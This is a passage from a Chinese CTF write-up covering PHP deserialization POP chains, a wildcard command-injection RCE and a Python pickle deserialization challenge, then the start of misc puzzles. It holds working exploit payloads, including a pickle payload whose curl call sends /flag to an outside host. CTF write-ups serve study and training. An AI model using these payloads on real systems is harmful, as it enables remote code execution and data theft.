class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Okay, you get the key, but we send you &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;age&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;age&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>给定了flag位置，同时又有<code>file_get_contents</code>,那么就从learn函数入手。很明显<code>__invoke</code>调用了<code>learn</code>，传进去了可控的<code>$var</code>，而在<code>yong::__tostring</code>中可以触发<code>baby::__invoke</code>，<code>old::__get</code>中可以触发<code>yong::__tostring</code>，baby中的getAge又能触发<code>old::__get</code></p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">baby</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;/flag.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var3</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">learn</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-variable">$key</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getAge</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;var2-&gt;var3;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">learn</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAge</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">young</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">old</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Okay, you get the key, but we send you &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">baby</span>();<br><span class="hljs-variable">$a</span>-&gt;var2 = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">old</span>();<br><span class="hljs-variable">$a</span>-&gt;var2-&gt;<span class="hljs-keyword">var</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">young</span>();<br><span class="hljs-variable">$a</span>-&gt;var2-&gt;<span class="hljs-keyword">var</span>-&gt;<span class="hljs-keyword">var</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">baby</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><h2 id="决赛-p2rce"><a href="#决赛-p2rce" class="headerlink" title="决赛[p2rce]"></a>决赛[p2rce]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;flag&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a === <span class="hljs-variable language_">$this</span>-&gt;b) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;c;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;s-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;b) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9_$]+/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;b)) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-variable">$flag</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;br/&gt;get it!!&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>])) &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;goaway!!!&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>从<code>CCC::__destruct</code>进入，有个判断，用<code>&amp;</code>引用地址，使<code>$a</code>永远与<code>$b</code>相等，然后echo触发<code>AAA::__toString</code>，接着可以通过return对象中不存在的属性来触发<code>BBB::__get</code>，最后绕过正则实现rce</p><p>最后结尾还有一个<code>throw new Exception</code>，破坏字符串结构即可触发fast destruct</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = &amp;<span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;flag&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a === <span class="hljs-variable language_">$this</span>-&gt;b) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;c;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;lewiserii&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;s-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;/???/?? /* .&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;b) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9_$]+/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;b)) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-variable">$flag</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;br/&gt;get it!!&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CCC</span>();<br><span class="hljs-variable">$a</span>-&gt;c = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">AAA</span>();<br><span class="hljs-variable">$a</span>-&gt;c-&gt;s = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">BBB</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p><code>O%3A3%3A%22CCC%22%3A3%3A%7Bs%3A1%3A%22c%22%3BO%3A3%3A%22AAA%22%3A2%3A%7Bs%3A1%3A%22s%22%3BO%3A3%3A%22BBB%22%3A1%3A%7Bs%3A1%3A%22b%22%3Bs%3A12%3A%22%2F%3F%3F%3F%2F%3F%3F+%2F%2A+.%22%3B%7Ds%3A1%3A%22a%22%3Bs%3A9%3A%22lewiserii%22%3B%7Ds%3A1%3A%22a%22%3BN%3Bs%3A1%3A%22b%22%3BR%3A6%3B</code></p><p>通过通配符匹配&#x2F;bin&#x2F;cp，将根目录所有文件复制到根目录，然后访问获得flag</p><p>或者通过<code>. /???/????????[@-[]</code>匹配php的临时文件来rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /?ctf=O%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>CCC%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>c%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>AAA%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>s%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>BBB%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>b%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A20%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>.+%<span class="hljs-number">2</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">2</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">5</span>B%<span class="hljs-number">40</span>-%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>a%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A9%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>lewiserii%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>a%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>b%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BR%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>B% HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">100.100</span>:<span class="hljs-number">10033</span><br>Content-Length: <span class="hljs-number">186</span><br>Cache-Control: max-age=<span class="hljs-number">0</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>Origin: <span class="hljs-literal">null</span><br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0xXn6nlxZVqh49pS<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">119.0</span>.<span class="hljs-number">0.0</span> Safari/<span class="hljs-number">537.36</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">------WebKitFormBoundary0xXn6nlxZVqh49pS</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;</span><br><span class="hljs-comment">Content-Type: text/plain</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">cat /f*</span><br><span class="hljs-comment">------WebKitFormBoundary0xXn6nlxZVqh49pS--</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><h2 id="决赛-babyWeb"><a href="#决赛-babyWeb" class="headerlink" title="决赛[babyWeb]"></a>决赛[babyWeb]</h2><p>pickle反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GetShellWithPython</span>(<span class="hljs-title class_ inherited__">object</span>):<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>       <span class="hljs-keyword">import</span> subprocess<br>       <span class="hljs-keyword">return</span> (subprocess.call,<br>              ([<span class="hljs-string">&#x27;python&#x27;</span>,<br>                 <span class="hljs-string">&#x27;-c&#x27;</span>,<br>                 <span class="hljs-string">&#x27;import os;&#x27;</span><br>                 <span class="hljs-string">&#x27;os.system(&quot;curl http://x.x.x.x:4444?a=`cat /flag`&quot;);&#x27;</span>],))<br><br>pickleData = pickle.dumps(GetShellWithPython())<br><br><span class="hljs-built_in">print</span>(base64.b64encode(pickleData))<br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="初赛-number-game"><a href="#初赛-number-game" class="headerlink" title="初赛[number game]"></a>初赛[number game]</h2><p>查看index.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">roll</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> _0x38f496 = _0x359f<br>      , _0x1afb7a = <span class="hljs-title class_">Math</span>[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xda</span>)](<span class="hljs-title class_">Math</span>[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xd5</span>)]() * <span class="hljs-number">0x3e8</span>);<br>    <span class="hljs-variable language_">document</span>[<span class="hljs-string">&#x27;getElementById&#x27;</span>](<span class="hljs-string">&#x27;number&#x27;</span>)[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xdc</span>)] = _0x1afb7a[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xd3</span>)]();<br>    <span class="hljs-keyword">if</span> (_0x1afb7a == <span class="hljs-number">0x539</span>) &#123;<br>        <span class="hljs-keyword">var</span> _0x14184c = [<span class="hljs-number">0x38</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xa</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x5a</span>]<br>          , _0x477866 = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> _0x6698b7 = <span class="hljs-number">0x0</span>; _0x6698b7 &lt; _0x14184c[<span class="hljs-string">&#x27;length&#x27;</span>]; _0x6698b7++)<br>            _0x477866 += <span class="hljs-title class_">String</span>[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xd9</span>)](_0x14184c[_0x6698b7] ^ _0x6698b7 + <span class="hljs-number">0x5a</span>);<br>        <span class="hljs-title function_">alert</span>(_0x477866);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x38</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x3c</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0xb</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0xb</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0x3d</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x1a</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x5a</span>]<br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(a):<br>    a[i]=v^i+<span class="hljs-number">0x5a</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a))<br></code></pre></td></tr></table></figure><h2 id="初赛-Ez-misc"><a href="#初赛-Ez-misc" class="headerlink" title="初赛[Ez_misc]"></a>初赛[Ez_misc]</h2><p>文件高位和低位交换位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.jpg&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.jpg&#x27;</span>,<span 